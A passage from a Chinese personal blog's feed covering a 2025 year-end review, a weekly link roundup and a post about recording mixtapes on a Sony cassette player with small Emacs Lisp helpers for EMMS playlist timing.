+在联邦宇宙上发帖被同去看音律联觉的象友看到然后联系上了，开始商量一起游玩的行程。怎么说呢，也是太感谢能被 pick 上了，否则按我这宅性只会选择
+一直躺尸，那也太浪费了还躺不舒适。&lt;/p&gt;&lt;h3 id=&quot;戏能通神&quot;&gt;戏能通神&lt;/h3&gt;&lt;p&gt;中午去名叫「鱻」的餐馆吃饭，一开始我就说除了生的其它都能接受，然后就精准点到生三文鱼做的餐品了。额，其实也是能接受的啦，只是要做点心里准备然后带着复杂心情品味。
+跟象友聊音律联觉，最后旁边的一位带着演唱会袋子的女博就说能不能加个好友，这时还没有出租屋蟑螂圣经呢，这位在粥玩家群体里算勇敢的了（？可惜我是 B 服，受限最
+远的距离就没加上了。&lt;/p&gt;&lt;p&gt;下午的行程是去剧场看剧《莎士比亚的罗朱》，对于我这种完全没看剧经验的人来说也是新奇的体验呢。全程我就处于：我是谁；他们是谁？为什么要在课桌上跳来跳去；怎么
+最后就突然亲上了的一种茫然状态。不过感受到了其中的炽烈的情感，也是体会到了古希腊中对戏剧的描述，戏果真能
+通神啊。虽然不懂，不过体验确实挺好的，感叹现场演出确实是现今艺术上最无可替代的形式了。&lt;/p&gt;&lt;h3 id=&quot;联觉联觉&quot;&gt;联觉联觉&lt;/h3&gt;&lt;p&gt;傍晚和象友分别后我就来到梅奔场，连安检的保安喇叭里放着的喊话都是博士博士的叫了，还挺专业？进入场馆后跟旁边的博士攀谈了起来，感动竟然是 B 服的，要不然出来这种同好
+集会一个好友都没加上那也悲催了吧！之后就是梦幻般的演出场景了，时间是真的很快就没什么实感的过去了。另外就是鹰角是真知道 Mystic Light Quest 会是重点还
+贴心的给屏幕上的 PV 加上罗马音帮助大家跟唱，其中那个礼炮一响真是……感到泪都要掉下来，这就是乐魂所在啊。&lt;/p&gt;&lt;p&gt;也是在录播放出后偶尔回来看看，闪回体验了说是：&lt;a href=&quot;https://www.bilibili.com/video/BV1dwg5zCEBD/&quot; class=&quot;external_link&quot;&gt;《明日方舟》2025「音律联觉-熠曲丰碑」官方录播_哔哩哔哩_bilibili&lt;/a&gt;&lt;/p&gt;&lt;p&gt;散场回到旅馆附近拖着疲惫的身躯来到便利店打算买点东西吃，没想到店员小哥突然抓起一瓶魔爪滴的一声火速拿自己手机结帐后塞给了我。我顿时愣住然后看着他的笑脸才
+反应过来我是被……请了？然后开始聊天，我说你去看演出了吗他说想啊，可惜没抢到票。最后我就拿了些会场收的无料分给了
+他（演出伴手礼中的东西已经有之前被请的博士送了，可惜），大部分都是界园相关的，这时大家都沉浸在对肉鸽界园主题的畅
+想和期待中呢……&lt;/p&gt;&lt;h2 id=&quot;关键词&quot;&gt;关键词&lt;/h2&gt;&lt;p&gt;二四年的年终总结给的关键词是「建造」，现在看来还是挺应验的。生活上在慢慢建里属于自己的模式并在慢慢践行了，就是健康上有
+很多地方可以优化，例如：多睡点多睡点多和多睡点。&lt;/p&gt;&lt;p&gt;二五年博客方面上的「建造」比起二四年变化更明显了，在十月份开启了写周刊的模式到现在还在遵守，对我这个三分钟热度的人来说是
+了不起的一件事了。办属于自己的电子刊也是对这个日益极化互联网的一种表态吧，不过还有一个原因就是那段时间刚把博客的框架更
+换了 &lt;sup&gt;&lt;a href=&quot;#2&quot; id=&quot;2r&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; ，能用 Scheme 来组织整个流程并用 org-mode 来写博客内容对创作动力也是很大提升。&lt;/p&gt;&lt;p&gt;技术方面上「建造」在二五年则是更加坚定使用 Lisp 作为主要语言了。都说用 Lisp 的人都像是「巫师」一样，但我觉得我更像一
+个「道士」，还是阵法专业的。当其他人直接挥动魔杖念出咒语工作时，我得首先拿出阿隆佐·邱奇、迪杰斯特拉、图灵几位祖师爷的牌
+位拜几下，然后摆出 Hy, Clojure, ClojureDart 这种阵图在 Python, Java, Dart 这种「灵脉」上运转 eval 和 apply
+两股阴阳力量开启括括又号号大阵最后才来施法。非常折腾，但我们阵法专精的就是这样的。&lt;/p&gt;&lt;p&gt;二四年展望的 Guix 也确实鼓捣起来了，最后建立了属于自己的「洞府」，把个人相关的 dotfiles 、用到的应用甚
+至 Steam Deck &lt;sup&gt;&lt;a href=&quot;#3&quot; id=&quot;3r&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; 和树莓派 &lt;sup&gt;&lt;a href=&quot;#4&quot; id=&quot;4r&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; 都囊括了进去。不知是在这种毫无「希望」全靠自己摸爬滚打场景中待惯了还是怎的，后半年
+有点信心爆棚将这种劲外衍了，开始拿 ClojureDart 改动了 Pilipala 这个第三方 B 站播放
+器 &lt;sup&gt;&lt;a href=&quot;#5&quot; id=&quot;5r&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; 抑或是用 Lips 写了个流媒体平台的替代前端 &lt;sup&gt;&lt;a href=&quot;#6&quot; id=&quot;6r&quot;&gt;6&lt;/a&gt;&lt;/sup&gt; 。&lt;/p&gt;&lt;p&gt;这些「建造」现在盘点下确实还是颇有收获，不过就是感觉二四年展望的「打地基」这方面没怎么投入，或许在新一年能找补
+下。那么在此也展望下新一年的关键词吧，还没想好但觉得和「游」有关，是「遨游」还是「游心」？甚至「游戏」都有可能。&lt;/p&gt;&lt;h2 id=&quot;最后&quot;&gt;最后&lt;/h2&gt;&lt;p&gt;虽是新的一年，但不是新的我。知道自己是只喜欢趴着的慵懒狐就没必要定什么目标来折磨自己了，顶多想个笼统的词
+语供之后的一年稍微「咀嚼」下。&lt;/p&gt;&lt;p&gt;写于二六年的一月二十号，二十四节气的最后一个节气大寒。西北风气流和来袭的冷空气也终于来到尽头，春天已然
+不远了。&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 土用指的是四季交替之间的过渡时期，详见： &lt;a href=&quot;https://ja.wikipedia.org/wiki/%E5%9C%9F%E7%94%A8&quot; class=&quot;external_link&quot;&gt;土用 - Wikipedia&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#2r&quot; id=&quot;2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;/2025/09/hello-haunt/&quot;&gt;Hello Haunt, 又一次换了博客框架&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#3r&quot; id=&quot;3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;/2025/05/configure-steam-deck/&quot;&gt;Steam Deck 可劲折腾&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#4r&quot; id=&quot;4&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;/2025/12/does-the-fox-eat-raspberry-pi/&quot;&gt;狐狸会喜欢树莓做的派吗？树莓派鼓捣记&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#5r&quot; id=&quot;5&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://git.southfox.me/southfox/clodala&quot; class=&quot;external_link&quot;&gt;southfox/clodala - Gitea: Git with a cup of tea&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#6r&quot; id=&quot;6&quot;&gt;6&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;/2025/12/traditional-craftsmanship-frontend/&quot;&gt;古法手做网页前端项目&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title>FoxThinking #14: 我好像没那么在乎「最佳实践」了</title><guid>https://blog.southfox.me/2026/01/fox-thinking-14/index.html</guid><pubDate>Mon, 19 Jan 2026 17:03:00 Z</pubDate><link>https://blog.southfox.me/2026/01/fox-thinking-14/index.html</link><description>&lt;p&gt;翻看着二五年的项目，发现我好像确实走上了一条没什么人走的道路。&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;翻看着二五年的项目，发现我好像确实走上了一条没什么人走的道路。&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;p&gt;二五年鼓捣的项目都非常的偏，没有所谓的「最佳实践」可以践行，一些项目甚至连像样的文档
+都没有。在经历了数不胜数的遇到困难睡大觉起来后觉得还是有点不甘然后继续折腾时刻后，发现自己开始
+慢慢适应了。如果没有「最佳实践」可以参照那就自己慢慢走吧，就算路上荒无人烟，就算走到荒山野岭，不过不要犯蠢，
+知道自己的极限在哪，好的建议还是要听听的。&lt;/p&gt;&lt;p&gt;接下来我想着能不能将这份感悟推广到 life art 上，生活有时候就是不能被一个「工程模板」和热门「框架」描述，
+这种没有「最佳实践」执行要自己慢慢实验的生活，我准备好了吗？&lt;/p&gt;&lt;h2 id=&quot;阅读&quot;&gt;阅读&lt;/h2&gt;&lt;p&gt;新年了，恭喜下列软件迎来了新周年庆或是新版本：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://wikimediafoundation.org/wikipedia25/&quot; class=&quot;external_link&quot;&gt;Celebrate Wikipedia’s 25th Birthday – Wikimedia Foundation&lt;/a&gt;: 维基百科 25 周年，也是 mediawiki 这
+自由软件的胜利。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://forgejo.org/2026-01-release-v14-0/&quot; class=&quot;external_link&quot;&gt;Forgejo v14.0 is available — Forgejo&lt;/a&gt;: forgejo v14 ，虽然感觉联邦实作还有好长一段距离，不过至少看到有在推动
+也是令人鼓舞了，光是想想跨实例提 PR 的功能会是以怎么样的方式运作就令人雀跃了。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://blog.jquery.com/2026/01/17/jquery-4-0-0/&quot; class=&quot;external_link&quot;&gt;jQuery 4.0.0&lt;/a&gt;: 你是……？虽然我从来没用过，但快二十年了还在发大版本也是一种胜利。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;欧灭跌多，啪啪啪啪啪……&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://drajmarsh.bitbucket.io/earthsun.html&quot; class=&quot;external_link&quot;&gt;Sun Position Calculator&lt;/a&gt;: 一个太阳位置计算网页应用，加入到我的工具箱中（想加点天文学技能点了说是）。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://news.ycombinator.com/item?id=46635345&quot; class=&quot;external_link&quot;&gt;Ask HN: How can we solve the loneliness epidemic? | Hacker News&lt;/a&gt;: 后疫情时代感觉整个社会都经历了关系断裂和
+席卷的孤独，连 HN 这种刻板印象中的「书呆子」社区也在热烈讨论了如何应对孤独。翻着讨论我意识到确实我从来没有深刻参与到某种活动
+中去，所以从小到大都没什么联系感。讨论中说到最好的方式是自己主办一个聚会，但是今年开始锻炼「主持人插件」并装备上是不是有点太
+托大了？或许可以到处看看有没有活动可以参加，今年我想多多出来逛逛发展一些关系（有点像狐狸出洞）。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://letsencrypt.org/2026/01/15/6day-and-ip-general-availability&quot; class=&quot;external_link&quot;&gt;6-day and IP Address Certificates are Generally Available - Let's Encrypt&lt;/a&gt;: Let's Encrypt 组织支持现
+为期六天的 IP 证书，目前我想到的用途是给不想备案的国内服务器上的类似网盘、同步应用这种需要优秀延迟和响应速度的服
+务套 HTTPS ？&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://xlii.space/eng/i-hate-github-actions-with-passion/&quot; class=&quot;external_link&quot;&gt;I Hate Github Actions with Passion&lt;/a&gt;: 对 Github Action 的吐槽，这种点击重试坐在屏幕苦等后弹出一个红叉的场景然后砸桌
+是每个调试 Github Action 的人都遇到过的。看着 HN 里的建议有用 Nix 来锁定环境的，在想或许我可以试试将 Guix 引入
+到 Github Action 环境中？&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://blog.emojipedia.org/emoji-design-convergence-review-2018-2026/&quot; class=&quot;external_link&quot;&gt;Emoji Design Convergence Review: 2018 - 2026&lt;/a&gt;: 也是解答了我一直有的疑问，为什么 mastodon 这种应用要额外引入一个库替换
+掉原生 emoji ？因为原生 emoji 确实有设计上的分歧，笑脸可能会变白眼，所以只得用三方库将这种分歧给消灭掉。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://yogthos.net/posts/2026-01-16-lattice-mcp.html&quot; class=&quot;external_link&quot;&gt;(iterate think thoughts): Stop Round-Tripping Your Codebase: How to Cut LLM Token Usage by 80% Using Recursive Document Analysis&lt;/a&gt;: 出现了，我一直觉得 S 表达式这种对于机器理解友好的语法在之后的 LLM 环境中会更受青睐，现在就看到了个例子，
+将代码仓库当成一个环境然后用一些定义好的过程给 LLM 使用就能用更少的 token 消耗做同样的事。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://lalitm.com/post/why-senior-engineers-let-bad-projects-fail/&quot; class=&quot;external_link&quot;&gt;Why Senior Engineers Let Bad Projects Fail - Lalit Maganti&lt;/a&gt;: 严肃学习中。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;之后是讲 org-mode 和 markdown 的文章：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://karl-voit.at/2025/08/17/Markdown-disaster/&quot; class=&quot;external_link&quot;&gt;Markdown Is a Disaster: Why and What to Do Instead&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://karl-voit.at/2017/09/23/orgmode-as-markup-only/&quot; class=&quot;external_link&quot;&gt;Org Mode Syntax Is One of the Most Reasonable Markup Languages to Use for Text&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Markdown 确实有些地方我是没弄懂，例如像 lisp 一样超级分裂的方言状况，根本不知道到底能用什么语法，还有就是链接语法方括号和圆
+括号到底谁在前谁在后我到现在也没记住。不过虽然 org-mode 有规范，一些语法设计好点但是也有很多怪地方，例如粗体斜线这种标记语法
+强制要求前后必须是空格及根本考虑过网络图片（在 Emacs 显示 HTTP 图片要自己做一大堆 hack ）。不过 org-mode 不仅仅是简单
+的标记语法，它是 Emacs 文本环境的体现，只凭这一点我就继续选择用 org-mode 了。&lt;/p&gt;&lt;p&gt;然后是一些关于个人站点主题的文章：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://henry.codes/writing/a-website-to-destroy-all-websites/&quot; class=&quot;external_link&quot;&gt;A Website To End All Websites | Henry From Online&lt;/a&gt;: 原来因为汽车发展导致城市规划围着大家默认有汽车而规划导致没车寸步难行
+的场景（例子：美国）叫极端垄断（Radical Monopoly）。现代互联网或者说社交媒体已经是这种情况了，怎么反抗呢？用个人网站及
+其 &lt;a href=&quot;https://indieweb.org/POSSE&quot; class=&quot;external_link&quot;&gt;POSSE&lt;/a&gt; 或者是&lt;a href=&quot;https://jointhefediverse.net&quot; class=&quot;external_link&quot;&gt;联邦宇宙&lt;/a&gt;这种邦联制的社交平台。所以是时候建立属于自己的个人网站了，用免费的二级域名也没关系、不懂
+编程没关系。只要有新的个人网站建立，互联网就会更健康一分……&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://susam.net/writing-first-tooling-second.html&quot; class=&quot;external_link&quot;&gt;Writing First, Tooling Second - Susam Pal&lt;/a&gt;: 在自己的个人网站哪怕直接写 HTML 页面也没关系，毕竟重要的是内容和想法，然后
+才是工具或者框架上的事……或者，也不尽然？例如我这就是因为自己折腾了框架然后大力推动了写作的欲望。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://maurycyz.com/misc/new_ssg/&quot; class=&quot;external_link&quot;&gt;Writing my own static site generator: (Maurycy's blog)&lt;/a&gt;: 用 700 行 c 代码实现的简单静态网站生成器，简单是好的，不过
+可惜我就是要一些复杂「花哨」的功能，嗯……之后得把这个框架下的代码好好整理下了。&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;诶呀，看着又大又空的主题部分就知道我又是死线战士临近到头才来想的，希望能慢慢减少这种情况发生。这周将精力花在了鼓捣磁带播放器
+上，现在写完这篇周刊明天要趁着大寒这最后一个节气时间点写年终总结了，怎么我突然就成了高产博主了呢？&lt;/p&gt;</content:encoded></item><item><title>一拉一扯，磁带行者</title><guid>https://blog.southfox.me/2026/01/cassette-player-in-2026/index.html</guid><pubDate>Sun, 18 Jan 2026 21:38:00 Z</pubDate><link>https://blog.southfox.me/2026/01/cassette-player-in-2026/index.html</link><description>&lt;p&gt;磁带播放器就这么悄悄退出了历史舞台，而我现在跑到后台拿到了它的联系方式。&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;磁带播放器就这么悄悄退出了历史舞台，而我现在跑到后台拿到了它的联系方式。&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;figure&gt;&lt;img src=&quot;https://media.southfox.me/media_attachments/files/115/911/236/055/931/550/original/c5e2090669de1749.jpg&quot; alt=&quot;一个带着 vhs 滤镜的相片，显示了一个用 gpd pocket 小型电脑通过 3.5 转 3.5 链接到磁带机同时磁带机链接到一个 koss pp 小型头戴耳机，旁边手机支架放着个磁带的场景&quot; href=&quot;https://media.southfox.me/media_attachments/files/115/911/236/055/931/550/original/c5e2090669de1749.jpg&quot; class=&quot;external_link&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;一个带着 vhs 滤镜的相片，显示了一个用 gpd pocket 小型电脑通过 3.5 转 3.5 链接到磁带机同时磁带机链接到一个 koss pp 小型头戴耳机，旁边手机支架放着个磁带的场景&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;h2 id=&quot;契机&quot;&gt;契机&lt;/h2&gt;&lt;p&gt;现在是一月份都过去大半的二六年了，我却还在折腾磁带播放器，是的，流媒体很方便音质也好，那我为什么不用呢？
+因为我是老用户与狗，在运营商那混不到什么好脸色，套餐流量额度还维持在七八年前的水准，不怎么高。
+音质上我更是个「木耳」，听不出流媒体音质之间的区别。不过这些问题可以通过在应用里开启缓存解决所以我也没什么抱怨，
+但在去年七月份的早起赶工出门时手机没握住让手机从楼梯上摔到楼下成功报废，也是体验了一把现代社会没有智能终端的尴尬（没
+带现金过地铁都要靠好心工作人员「施舍」）。当时上午就紧急下单了（还有十几分钟就过了能下午当日送的点了）新手机，下午
+到货时没配置多久就傻眼了……这手机没有先进的 3.5 耳机接口！只有一个干巴巴的 type-c 接口，没办法，只能再去网上买了
+个 3.5 转 type-c 的 DAC 用着。不过我一直耿耿于怀，毕竟耳机要绑个「小尾巴」太麻烦了，每次从手机切换到电脑都要多
+一步操作不说，这个钥匙般大小的转接头还经常要我好找（不要指望有 ADHD 特质的人能放好东西）。&lt;/p&gt;&lt;p&gt;在十二月时，看到了奇客的报道 &lt;a href=&quot;https://www.solidot.org/story?sid=83067&quot; class=&quot;external_link&quot;&gt;奇客Solidot | 美国 Z 世代再次青睐实体媒介&lt;/a&gt; 动了想折腾实体介质的念头。黑胶 CD 这些我没怎么
+用过没什么兴趣，但磁带，似乎还能从模糊的童年记忆里翻找出一些场景，打开一个磁带播放器放入一卷磁带播放英语录音什么的。好吧，那就来
+看看磁带播放器吧。&lt;/p&gt;&lt;h2 id=&quot;下单&quot;&gt;下单&lt;/h2&gt;&lt;p&gt;动了心思后就在淘宝上和视频平台乱逛，了解到一些大概信息。本来是想买更现代的近产设备，毕竟时代在发展，科技在进步不是吗？还能
+享受到 type-c 接口和更大容量的电池……但我看了下在小众领域可不是这样的，当时的磁带生产线清出的那么快，而这个市场现在又那么
+小众，就造就了一种「绝地天通」断代级别的现象。好的解码芯片已经无法在现代由小厂家中生产出来了，看到一些临近出的机子甚至
+没有自动翻面的功能，而自动翻面功能在千禧年一众旗舰磁带播放器可是标配功能。折腾小众的播放器确实有格调但是要自己每隔半小时或四十
+多分钟手动拿出机器来手动翻面也太「装」太折腾了。&lt;/p&gt;&lt;p&gt;最后还是选择了以二手的磁带热潮时期出产的播放器为目标。因为觉得没什么精力在二手市场「狩猎」和折腾维
+修（虽然我有嵌入式经验但已不想再握住焊枪了）及养护机子了，所以就找了个专门做这种的店铺，里面的溢价我就当成保险费了。最后选择是
+索尼的 WM GX677 型号。看重的主要原因是录放一体机，意味着我可以用机器的麦克风输入来录点磁带，虽然效果不如专业做这些的卡座机，不
+过有就行了，或许这个磁带产生的「摇晃飘离」感正适合我喜欢的 lofi 音乐呢。到手后确实感叹世纪初那种集成电路大爆发的科技进步，复杂的
+机械结构和操作逻辑就这样压缩在了比磁带大不了多少的机器里，好像我对这种既有笨重实物又有先进集成电路的「混合感」的物件没什么抵抗力呢。&lt;/p&gt;&lt;p&gt;然后是磁带，这个就直接从「二手 磁带 一类」的搜索结果挑了家最多人买的店铺买，虽然很战损成色，不过能用啊。最后就是一个 3.5 对 3.5 的
+线，将播放设备从 3.5 输出在输入进 GX677 麦克风口就能实现录音了。&lt;/p&gt;&lt;h2 id=&quot;电台&quot;&gt;电台&lt;/h2&gt;&lt;p&gt;播放器首先比磁带先到货没磁带的情况下就先听了听 FM 电台的功能，在刺啦刺啦的噪声中找到一个电台还是挺新奇的，在这时才发觉现在手机已经不
+支持插个耳机当天线收听 FM 电台了啊……&lt;/p&gt;&lt;p&gt;稍微带着这个播放器听着电台出去走了走，感受是现在的无线电干扰也挺大的，走到某个路牌下或者路过某个店铺就能明显感受到刺啦的
+杂音。听久了电台发现基本都是交通台交通信息和精准针对目标人群的广告例如保健品或装修优惠啥的，不由感叹一代产品就盯着一代人使劲薅啊，或许
+三四十年后现在「传统」搓玻璃屏幕设备广告也都是保健品和什么保养手术，更现代更新奇的广告只会在脑机接口设备上展示。&lt;/p&gt;&lt;h2 id=&quot;下载&quot;&gt;下载&lt;/h2&gt;&lt;p&gt;磁带到货后首先是就拿一些 lofi 电台的歌试了下，首先是用 &lt;a href=&quot;https://app.chillhop.com/&quot; class=&quot;external_link&quot;&gt;Livestream - Chillhop Music&lt;/a&gt; 的……API 获取音乐文件地址
+然后 MPV 播放器播放录入到磁带机里。效果十分不错，这种 lofi 味搭配磁带机的「摇晃暖糯」感确实更有味道了。&lt;/p&gt;&lt;p&gt;不过除了 lofi 音乐我还想听点网易云上的音乐。嗯，简单点可以通过一些工具将手机上下载的专有 ncm 格式文件转换
+成 mp3 就行了吧，不，其实还有个更简单的办法就是通过网易云的……API （当个游走在自由软件和专有平台的狐不得不点了挖
+掘 API 的技能点）然后直接获取 mp3 地址，然后就能直接下载了。去年初我还将相关 API 封装了
+个 Emacs 包： &lt;a href=&quot;https://git.southfox.me/elisp/enep.el&quot; class=&quot;external_link&quot;&gt;elisp/enep.el&lt;/a&gt; 方便自己使用。因为现在只有通过 ID 直接下载歌曲的功能（其它功能需要数据设计，而歌曲、
+歌手、专辑是经典的多对多关系，想想就觉得麻烦就没继续弄了）。不过就算这样在 Emacs 里也能方便下这个过程，意识到网易云 Web
+端可以轻易复制类似的链接 https://music.163.com/song?id=478507889 从里面获取 ID 然后通过写好的函数下载歌曲。
+就糊了个小函数：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-emacs-lisp&quot;&gt;(defun my/direct-download-netease-music (link)
+  (interactive (list (org-cliplink-clipboard-content)))
+  (let ((music-id (car (last (string-split link &amp;quot;id=&amp;quot;)))))
+    (enep-download-music music-id)))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;作用直接读取剪贴板的内容并 split 链接读取到 ID 丢到下载函数。&lt;/p&gt;&lt;h2 id=&quot;制作&quot;&gt;制作&lt;/h2&gt;&lt;p&gt;那么有了歌曲就该来制作点混音带（MixTape）了，在七八十的洪荒年代的人们没有像现在应用里一键新建个歌单那么简单，只能自
+己从广播录音或从自己有的磁带「裁剪」转录到一张磁带上，这点上可以将混音带理解成私人制作的喜爱歌单吧。在现在自己动手做
+一个有着实体形式的喜爱歌单也是挺酷的一件事了。&lt;/p&gt;&lt;p&gt;但在操作中问题接踵而来，首先就是为了方便 GX677 的快进快退选歌功能，每首歌之间要加个三秒空白时间；播放列表的的歌要方便添删和移动
+歌曲的移动顺序；六十分钟的磁带一面只有三十分钟，要方便看出每首歌时间并计算总和时间（包括每两首歌之间的空白三秒）。这些需求如果让我
+自己慢慢算可能很快丧失热情了，到那里能够找到能够在两首歌之间加空白段的播放器和管理歌曲并计算歌曲总和时间的软件呢……？&lt;/p&gt;&lt;p&gt;幸好我知道有歌软件能做到这些，就是 Emacs ，准确来说是 Emacs 里的 &lt;a href=&quot;https://www.gnu.org/software/emms/&quot; class=&quot;external_link&quot;&gt;GNU Emms&lt;/a&gt; 包，可以很方便查看歌曲元数据和管理播放流程。&lt;/p&gt;&lt;p&gt;首先是每个歌曲之间加个 3 秒空白时间，因为 Emms 贴心的将播放下一首弄成可以自定义的，所以只需要：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-emacs-lisp&quot;&gt;(setq emms-player-next-function
+      (lambda ()
+        (run-at-time
+         3 nil
+         (lambda ()
+           (emms-next)))
+        ))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;就是将直接运行 &lt;code&gt;emms-next&lt;/code&gt; 改成了用定时器在 3 秒后执行，完美。&lt;/p&gt;&lt;p&gt;之后是管理播放列表，这方面当真是了不得，按下快捷键添加某首歌到当前的页面、能用 Vim 的方式选择多行
+按下 D 删除、按下快捷键将某首歌上升或下降顺序……欸，Emacs 你赢了，我甘愿将我的热情和心血奉献给你。&lt;/p&gt;&lt;p&gt;最后是便捷查看歌曲时长并算出整体时间，这方面虽然 Emms 的歌曲信息显示是以「歌手」- 「专辑」- 「歌曲」名格式显示的，但是其实相关
+元数据在文本属性中（就像网页一样， &amp;lt;p info=&amp;quot;xxx&amp;quot;&amp;gt;Hello World!&amp;lt;/p&amp;gt; ，实际显示的文字背后可以装点数据）已经有包含了歌曲的长度
+信息了，也因 Emms 贴心的将歌曲信息查看函数弄成可以自定义的，所以只需要：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-emacs-lisp&quot;&gt;(defun my/emms-info-track-description (track)
+  (let ((artist (emms-track-get track 'info-artist))
+        (album (emms-track-get track 'info-album))
+        (title (emms-track-get track 'info-title))
+        (mtime (emms-track-get track 'info-playing-time)))
+    (format &amp;quot;%s - %s - %s - %02d:%02d&amp;quot;
+            (or artist &amp;quot;Unknown&amp;quot;)
+            (or album &amp;quot;Unknown&amp;quot;)
+            (or title &amp;quot;Unknown&amp;quot;)
+            (/ mtime 60) (% mtime 60))))
+
+(setq emms-track-description-function 'my/emms-info-track-description)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;就能在歌曲管理页面显示歌曲长度信息了，效果类似于这样：&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://media.southfox.me/attachment/2026-01-18_21-30-screenshot.jpg&quot; alt=&quot;EMMS 里显示歌曲信息页面截图&quot; href=&quot;https://media.southfox.me/attachment/2026-01-18_21-30-screenshot.jpg&quot; class=&quot;external_link&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;EMMS 里显示歌曲信息页面截图&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;最后是计算所选歌曲的长度信息，这个就更加直接了，写一个函数获取选择区域的文本提取出文本属性中的歌曲信息然后循环遍历加和（顺带也加上
+三秒空白时间）：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-emacs-lisp&quot;&gt;(defun my/emms-playlist-sum-duration (beg end)
+  (interactive &amp;quot;r&amp;quot;)
+  (let ((total-seconds 0)
+        (gap-seconds 3))
+    (save-excursion
+      (goto-char beg)
+      (while (&amp;lt; (point) end)
+        (let* ((track (emms-playlist-track-at (point)))
+               (duration (and track (emms-track-get track 'info-playing-time))))
+          (when duration
+            (setq total-seconds (+ total-seconds duration gap-seconds))))
+        (forward-line 1)))
+    (let ((hours (/ total-seconds 3600))
+          (minutes (/ (% total-seconds 3600) 60))
+          (seconds (% total-seconds 60)))
+      (message &amp;quot;Total Time: %02d:%02d:%02d&amp;quot;
+               hours minutes seconds)))))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样子一套组合拳下来就完满了，方便管理歌曲和计算总体时间。三十分钟一面的磁带准确来说还会多出两分钟所以最后定在了以三十二分钟为一面，不断
+折腾中也用到了 Sayonara wild hearts 这种轻快的一两分钟游戏原声填补（我折腾磁带好像也跟这游戏前几年出了磁带版游戏原声带有关，这
+游戏真是给我下降头了！），最后余下一分钟的实在补不足的就用 O Superman 这种前后没什么起伏的轻人声硬补。&lt;/p&gt;&lt;p&gt;实际录制只要将磁带快退到开头然后按下磁带录音键等个六七秒按下 Emacs 里的回车播放就能进行录制了，GX677 录制并没有什么特殊功能，所以要
+自己在实际录制前试录一段，音量如果过高就会出现类似「炒豆声」的细微爆裂声。录完之后按下 GX677 的播放翻页一体的按键转面继续录完剩下的歌，
+就能得到一份自己制作的混音带了！&lt;/p&gt;&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;&lt;p&gt;其实，我只是在远处观望过磁带盛行的时代，不过可能这种若有若无的感觉让我着迷吧。话说，感觉我的风格就是在追逐旧日
